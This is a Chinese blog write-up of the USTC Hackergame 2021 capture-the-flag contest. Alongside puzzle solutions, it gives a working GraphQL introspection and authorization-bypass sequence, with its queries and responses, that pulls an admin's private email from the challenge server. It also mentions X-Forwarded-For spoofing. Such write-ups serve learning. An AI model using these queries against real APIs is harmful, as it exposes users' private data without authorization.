---
title: 中科大Hackergame 2021
author: Mashiro
avatar: 'https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/modules/avatar.jpg'
authorLink: 'https://mashiro.nl'
authorAbout: 懒人，没技术，自学中......
authorDesc: Love Mashiro forever!
categories: 技术
comments: true
photos: >-
  https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/background/article-cover/79416681_p0.jpeg
date: 2021-11-06 21:31:08
tags: CTF
keywords: hackergame
description: 中科大信安赛Write Up
---


> 封面图：[#制服 - pixiv](https://www.pixiv.net/artworks/79416681)

## 前言
又菜又爱玩的 Mashiro 最近又开了一个新坑，之前了解到中科大举办的CTF比赛，对新手来说比较友好，所以作为网安“带师”的我自然不会错过啦！ ~~（指当炮灰~~ 这次拉上了 [@Zyan](https://lento-er.github.io/) 一起来玩，虽然有违反比赛规则的嫌疑🙈  

另外技术力有限，有纰漏的地方也欢迎大家指正啦 ~

## 签到题
> 为了能让大家顺利签到，命题组把每一秒的 flag 都记录下来制成了日记本的一页。你只需要打开日记，翻到 Hackergame 2021 比赛进行期间的任何一页就能得到 flag！
![sign-in](https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/image/2021-11/sign.webp)

因为赛前看过去年的题解，所以一眼发现了 url 有问题，每点击一下 Next 按钮时间会多一秒，page 参数也会加一，那么想拿到 flag 的话调到比赛时间即可。

随手找了个在线日期计算，就不敲代码实现了。  
请求 url：http://202.38.93.111:10000/?page=1634961600

BTW，看了别人的题解，发现开始时间的 1970-01-01 0:00:00 正好是 Unix 时间戳的起始时间，所以其实只用……
```shell
date +%s    // 计算 UTC 1970-01-01 0点到现在的秒数
```
总算是知道一分钟内拿下一血的大哥是怎么做的了 Orz

## 进制十六——参上
> 为严防 flag 泄漏以及其他存在于未来所有可能的意外灾难，神通广大的 Z 同学不仅强制要求每一道题目都加上权限和资源的限制，还给所有参与 Hackergame 2021 命题的计算机施加了一层法术结界。任何试图从结界逃逸的 flag 都会被无情抹除。
>
> 而一位明面上是计算机学院的新生，实则为物理学院暗部核心成员的 X 同学，在 Hackergame 2021 命题组已经潜伏多时。妄想趁比赛开始的午时，借阳火正旺之势，冲破 Z 同学的结界，以图片而非明文的形式，将 flag 悄悄传递出来。
>
> 好在 Z 同学法力之深厚，不可管窥蠡测。在 flag 被传出去的前两天，就已预知此事并将图片中的 flag 无声消泯了。
>
> 只是，这位 X 同学，虽然不会退出 Vim，但是似乎对打开十六进制编辑器颇有造诣……

![hex](https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/image/2021-11/hex_editor.png)
观察图片，发现黄色部分字母和数字是一一对应的关系，涂掉的部分就是 flag，题目也提示了十六进制相关，那先看看第一个字母 E 的 16 进制 ASCII 码是什么吧 ~ 发现正好是 45，问题解决。

接下来就简单了，找个识图工具把数字提取出来，再进行转换就好啦。

## 去吧！追寻自由的电波
> 为了打破 Z 同学布下的结界，X 同学偷偷搬出社团的业余无线电台试图向外界通讯。
>
> 当然，如果只是这样还远远不够。遵依史称“老爹”的上古先贤的至理名言，必须要“用魔法打败魔法”。X 同学向上级申请到了科大西区同步辐射实验室设备的使用权限，以此打通次元空间，借助到另一个平行宇宙中 Z 同学的法力进行数据对冲，方才于乱中搏得一丝机会，将 flag 用无线电的形式发射了出去。
>
> 考虑到信息的鲁棒性，X 同学使用了无线电中惯用的方法来区分字符串中读音相近的字母。即使如此，打破次元的强大能量扭曲了时空，使得最终接受到的录音的速度有所改变。
>
> 为了保障同步辐射设备的持续运转，组织牺牲了大量的能源，甚至以东北部分地区无计划限电为代价，把这份沉甸甸的录音文件送到了你的手上。而刚刚起床没多久，试图抢签到题一血还失败了的你，可以不辜负同学们对你的殷切期望吗？
>
> 注：flag 花括号内只包含小写字母。

[点击下载文件](https://github.com/USTC-Hackergame/hackergame2021-writeups/raw/master/official/%E5%8E%BB%E5%90%A7%EF%BC%81%E8%BF%BD%E5%AF%BB%E8%87%AA%E7%94%B1%E7%9A%84%E7%94%B5%E6%B3%A2/src/radio.mp3)  
拿到的是一个音频文件，打开一听，发现明显进行了加快。放进浏览器调 1/4 倍速，隐约听到 alpha，hotel……几个单词，然后题目提示了无线电，所以搜索了一下，发现了这个  
[国际无线电通话拼写字母](https://zh.wikipedia.org/wiki/%E5%8C%97%E7%BA%A6%E9%9F%B3%E6%A0%87%E5%AD%97%E6%AF%8D)  
那么接下来就是痛苦的英语听力环节（苦于不会修音，一开始才听出来几个单词，然后第五个词卡了好久，后来才发现是三个音节的，然而拼写表里面的单词最多也是两个音节的……所以那里是两个词，是 flag 后的 left-bracket，不是表里面的单词）

原文：
```text
Foxtrot Lima Alpha Golf left-bracket Papa Hotel Oscar November Echo Tango India Charlie Alfa Bravo right-bracket
```

## 猫咪问答 Pro Max
**提示：解出谜题不需要是科大在校学生**
- 第一题  
「2017 年，中科大信息安全俱乐部（SEC@USTC）并入中科大 Linux 用户协会（USTCLUG）。目前，信息安全俱乐部的域名（sec.ustc.edu.cn）已经无法访问，但你能找到信息安全俱乐部的社团章程在哪一天的会员代表大会上通过的吗？」  
<br />
看到那句已经无法访问，让我想起了阮老师的[一篇文章](https://www.ruanyifeng.com/blog/2007/11/internet_archive.html)里面提及的 [Internet Archive](https://archive.org/index.php)，猜测上面应该有存档，果不其然找到了这个  
https://web.archive.org/web/20170613090934/http://sec.ustc.edu.cn/doku.php/codes

- 第二题  
「中国科学技术大学 Linux 用户协会在近五年多少次被评为校五星级社团？」  
<br />
在科大 LUG 的介绍页面就能找到  
https://lug.ustc.edu.cn/wiki/intro/

> 为了表彰其出色表现，协会于 2011 年 5 月被评为中国科学技术大学优秀学生社团，于 2012 年 5 月、2013 年 5 月及 2014 年 5 月分别被评为中国科学技术大学四星级学生社团，并于 2015 年 5 月、2017 年 7 月、2018 年 9 月、2019 年 8 月、2020 年 9 月及 2021 年 9 月被评为中国科学技术大学五星级学生社团。

其实这里算歪打正着了，因为问的是近五年，所以 15 年是不算的，不过我们可以找到 21 年 LUG 还是五星社团（官方题解提示）  
https://zsb.ustc.edu.cn/_upload/article/images/aa/64/6fa4dabb4810a17cf7c1d978c481/bfc8bd9e-51a8-4b61-9c42-8d484a7d72c0.jpg

- 第三题  
「中国科学技术大学 Linux 用户协会位于西区图书馆的活动室门口的牌子上“LUG @ USTC”下方的小字是？」  
<br />
老实说我第一反应是找街景地图，但是发现只能看到图书馆门口，仅此而已。而且题目说的是图书馆的活动室，所以应该是在里面的。用街景地图的思路看来行不通，那就只能搜 LUG 关于图书馆的新闻，万幸找到了  
https://lug.ustc.edu.cn/news/2016/06/new-activity-room-in-west-library/  
小插曲：当时 Zyan 想到的居然是去 Shodan 找中科大图书馆有没有被入侵的摄像头，真的被他的脑洞惊到了，觉得他很有当 hacker 的潜质。

- 第四题  
「在 SIGBOVIK 2021 的一篇关于二进制 Newcomb-Benford 定律的论文中，作者一共展示了多少个数据集对其理论结果进行验证？」  
<br />
这题直接给工具人 Zyan 去看，因为文章很长  
http://sigbovik.org/2021/proceedings.pdf  
事实证明他做阅读理解还是有一手的，很快就把答案找出来了（他看完才发现可以看图来数，tcl）

- 第五题  
「不严格遵循协议规范的操作着实令人生厌，好在 IETF 于 2021 年成立了 Protocol Police 以监督并惩戒所有违背 RFC 文档的行为个体。假如你发现了某位同学可能违反了协议规范，根据 Protocol Police 相关文档中规定的举报方法，你应该将你的举报信发往何处？」（答案含九个字符）  
<br />
Google 搜索 protocol police 和 RFC，很容易找到 [rfc8962](https://datatracker.ietf.org/doc/html/rfc8962)

> 6.  Reporting Offenses  
Send all your reports of possible violations and all tips about
wrongdoing to /dev/null.  The Protocol Police are listening and will
take care of it.

其实里面有个 Unix 行话，/dev/null 即比特桶或者黑洞。因为其在类 Unix 系统中是一个特殊的设备文件，它丢弃一切写入其中的数据。

## 旅行照片
> 你的学长决定来一场说走就走的旅行。通过他发给你的照片来看，他应该是在酒店住下了。
![travel](https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/image/2021-11/travel-photo.jpg)
从照片来看，酒店似乎在小区的一栋高楼里，附近还有一家 KFC 分店。突然，你意识到照片里透露出来的信息比表面上看起来的要多。  
请观察照片并答对全部 5 道题以获取 flag。注意：图片未在其他地方公开发布过，也未采取任何隐写措施（通过手机拍摄屏幕亦可答题）。

- 第一题  
「该照片拍摄者的面朝方向为？」

- 第二题  
「该照片的拍摄时间大致为？」

- 第三题  
「该照片的拍摄者所在楼层为？」

- 第四题  
「该照片左上角 KFC 分店的电话号码是？」

- 第五题  
「该照片左上角 KFC 分店左侧建筑有三个水平排列的汉字，它们是？」

平时在 b 站看多了别人分析图片信息，没想到今天自己也要亲历一次头脑风暴，真是太棒了(x  
一开始是拿去 Google 和百度识图了，结果什么都没找到，毕竟题目说了图片未曾在其他地方公开。看图片感觉地点靠近港口，而且从公交车在街道上的朝向分析，估计是在国内的某个海滨。左上角隐约看见有家 KFC，然后没发现更多有用的信息了。找了 Zyan 一起分析，他说可以从开封菜下手，毕竟蓝色的 KFC 挺少见的。搜索蓝色 KFC，好家伙，原来那是一家网红店  
https://www.xiaohongshu.com/discovery/item/5e985cda00000000010076e5  
校验一下是不是吧，帖主给的地点是秦皇岛新澳海底世界，打开百度地图看看

![map](https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/image/2021-11/map.jpg)

评论里给的图片契合度挺高的，而且观察地图的海岸线，和题目图片的基本吻合，所以基本可以确定就是这个地方。题目还说了，酒店在小区的一栋高楼里，所以拍摄者的位置大概在 KFC 西北面的小区群里。接下来打开街景地图，发现 KFC 那条路没有街景，绝了！！！  
幸好 Zyan 在大众点评找到了这个（Zyan，我滴超人！大众点评，yyds！）

![Dolphinarium](https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/image/2021-11/Dolphinarium.jpg)

观察题目图片最右侧的那栋建筑，我们可以数到十六层，用手机大概模拟了一下，发现那种角度拍摄到的楼层不会超过拍摄者所在楼层的三层以上，估计是 13-15 其中一层，所以暴力穷举即可。

最后剩下拍摄时间的问题，通过建筑的阴影可以注意到太阳几乎从正西侧照射而来，故为傍晚。但当时判断方位不准确，所以我直接人肉遍历了一次时间😂

## 图之上的信息
> 小 T 听说 GraphQL 是一种特别的 API 设计模式，也是 RESTful API 的有力竞争者，所以他写了个小网站来实验这项技术。
>
> 你能通过这个全新的接口，获取到没有公开出来的管理员的邮箱地址吗？

这题就有 CTF 那味了，因为目前做到的题甚至都不用脚本去暴力穷举，更像是一种解密，多数都可以靠一些基本的社工学技巧去破解。搜索了一下 GraphQL 是个什么东西，发现是一种 API 查询语言？相当于在后端和数据库之间再套了一层（个人理解）。看了一下官方文档，发现概念挺抽象的。没办法，先打开题目看看吧 ~

给了一个登录界面，然后提供了 Guest 用户名和密码 Guest，登陆进去如下

![panel](https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/image/2021-11/gql-1.webp)

提示了 flag 是 admin 的邮箱。先 F12 打开控制台，查找 graphql，然后发现页面向 http://202.38.93.111:15001/graphql 发送了一次 POST 请求，十分可疑。

![post](https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/image/2021-11/gql-2.webp)

点击查看详情，发现请求参数如下
```request
{ 
  notes(userId: 2)
  { 
    id
    contents }
}
```
那么根据经验，admin 的 id 应该是 1，先改成 1 重发一次请求，看看有什么结果
```JavaScript
fetch("http://202.38.93.111:15001/graphql", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
    "content-type": "application/json",
    "proxy-connection": "keep-alive"
  },
  "referrer": "http://202.38.93.111:15001/notes",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "{\"query\":\"{ notes(userId: 1) { id\\ncontents }}\"}",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```
响应如下：
```json
{
	"errors": [
		{
			"message": "This user has no permission to access this.",
			"locations": [
				{
					"line": 1,
					"column": 3
				}
			],
			"path": [
				"notes"
			]
		}
	],
	"data": {
		"notes": null
	}
}
```

看来事情没有这么简单，但是又不太懂 graphql，那怎么查询呢？想了一下，别的 CTF 比赛应该也有相似类型的题目，用 graphql + ctf 两个关键词去搜索，果然找到了些许思路。

- https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/
- https://hwlanxiaojun.github.io/2020/04/14/当CTF遇上GraphQL的那些事/
- https://www.jianshu.com/p/e59a27a15b5a 的 GraphQL-WEB 部分

总的来说，是由于 GraphQL 存在内省机制，如果不加以处理，则可能会泄露系统中所有的可用的查询，以及查询支持的字段等信息。

这题估计也是要利用类似的漏洞，我们先通过`__schema`查询所有可用对象试试
```request
{
    __schema {
        types {
            name
        }
    }
}
```
结果如下
```json
{
	"data": {
		"__schema": {
			"types": [
				{
					"name": "Query"
				},
				{
					"name": "GNote"
				},
				{
					"name": "Int"
				},
				{
					"name": "String"
				},
				{
					"name": "GUser"
				},
				{
					"name": "Boolean"
				},
				{
					"name": "__Schema"
				},
				{
					"name": "__Type"
				},
				{
					"name": "__TypeKind"
				},
				{
					"name": "__Field"
				},
				{
					"name": "__InputValue"
				},
				{
					"name": "__EnumValue"
				},
				{
					"name": "__Directive"
				},
				{
					"name": "__DirectiveLocation"
				}
			]
		}
	}
}
```
其中比较敏感的是`GUser`这个对象，用`__type`查询`GUser`的所有字段：
```request
{
  __type(name: "GUser") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```
结果如下：
```json
{
	"data": {
		"__type": {
			"name": "GUser",
			"fields": [
				{
					"name": "id",
					"type": {
						"name": "Int",
						"kind": "SCALAR"
					}
				},
				{
					"name": "username",
					"type": {
						"name": "String",
						"kind": "SCALAR"
					}
				},
				{
					"name": "privateEmail",
					"type": {
						"name": "String",
						"kind": "SCALAR"
					}
				}
			]
		}
	}
}
```
Great！里面有个`privateEmail`，flag 应该就在里面。然后看一下`Query`里面定义的可用查询
```request
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```
结果：
```json
{
	"data": {
		"__schema": {
			"queryType": {
				"fields": [
					{
						"name": "note",
						"description": "Get a specific note information"
					},
					{
						"name": "notes",
						"description": "Get notes information of a user"
					},
					{
						"name": "user",
						"description": "Get a specific user information"
					}
				]
			}
		}
	}
}
```
那么最后猜测 admin 的 id 是 1，构造请求：
```request
{
    user(id:1) { 
        privateEmail 
    } 
}
```
返回结果：
```json
{
	"data": {
		"user": {
			"privateEmail": "flag{dont_let_graphql_l3ak_data_7e63d49f66@hackergame.ustc}"
		}
	}
}
```
GET FLAG!!!

## 有思路但没解出的题
- 卖瓜

![HQ](https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/image/2021-11/HQ.webp)

咋一看觉得是不可能的，因为 6 和 9 都是三的倍数，不用浮点数怎么也凑不到 20。试了一下，发现可以传入负数，但好像没什么用。一开始想着用 burpsuite 抓包修改数据，但是服务器没返回 flag。然后看了一下 19 年的题解，感觉这题大概率也是通过 INT64 溢出实现的，但还是没拿到 flag。~~（才不是不会构造呢！我有一个绝妙的方法，只是这里空间太小，写不下了）~~

- FLAG 助力大红包

> “听说没？【大砍刀】平台又双叒做活动啦！参与活动就送 0.5 个 flag 呢，攒满 1 个 flag 即可免费提取！”
> 
> “还有这么好的事情？我也要参加！”
> 
> “快点吧！我已经拿到 flag 了呢！再不参加 flag 就要发完了呢。”
> 
> “那怎么才能参加呢？”
> 
> “这还不简单！点击下面的链接就行”

![大砍刀](https://cdn.jsdelivr.net/gh/guohoo/blog-source@master/image/2021-11/大砍刀.webp)

感觉是要用到代理池等工具去做才行，然而官方题解是……
> 应当可以很容易发现，用户通过点击助力按钮，即可积攒 Flag 。但是题目写出会对源地址进行检查， 位于同一个 /8 网络内的用户只能助力一次。（一个 /8 网段内的所有 IP 地址的第一个字节是相同的。很容易可以知道， IPv4 中至多只有 256 个 /8 网段。
>
> 其实，如果对 Flag 数量进行多项式拟合，可以发现 flag 数量为一精确的二次函数：
> ```
> flag = (-0.0000076*(count-256)^2+1)
> ```
> 最终需要攒齐全部 256 个 /8 网段的助力才可获得全部 Flag。
>
> 即便没有上面这一步，应当可以很快意识（也许很难）到使用好友助力或使用代理池是不可行的，这是由于不是全部 IPv4 /8 地址块是可用的。这包括：
> 
> RFC1700 定义的 0.0.0.0/8 和回环地址 127.0.0.0/8。  
> RFC1918 定义的私有地址 10.0.0.0/8、192.168.0.0/16 ，172.16.0.0/12  
> RFC3171 定义的组播地址 224.0.0.0/4  
> RFC1700 定义的保留地址 240.0.0.0/4  
> 用于特殊网络的 14.0.0.0/8 , 24.0.0.0/8 以及 39.0.0.0/8  
> 美国国防部宣告的大量 IPv4 /8 网段，例如 6.0.0.0/8 ， 7.0.0.0/8 等等 十几个 /8 网段  
> 详细信息可用参考 [RFC3330](https://datatracker.ietf.org/doc/html/rfc3330).

所以要用 `X-Forwarded-For` 去欺骗服务器（555，自己太菜了

## 总结
做了六道题，比预期好很多，毕竟第一次打 CTF，所以菜也是情有可原的（bushi  
最终成绩是 general：450，web：250，math：0，binary：0，total：700  
数学和逆向一道都没写出来，流下了不学无术的泪水😭。

不过玩得挺开心的，也锻炼了自己快速学习的能力（虽然 GraphQL 还是一知半解），希望下一年密码学和逆向不要再 0 蛋吧 QAQ ~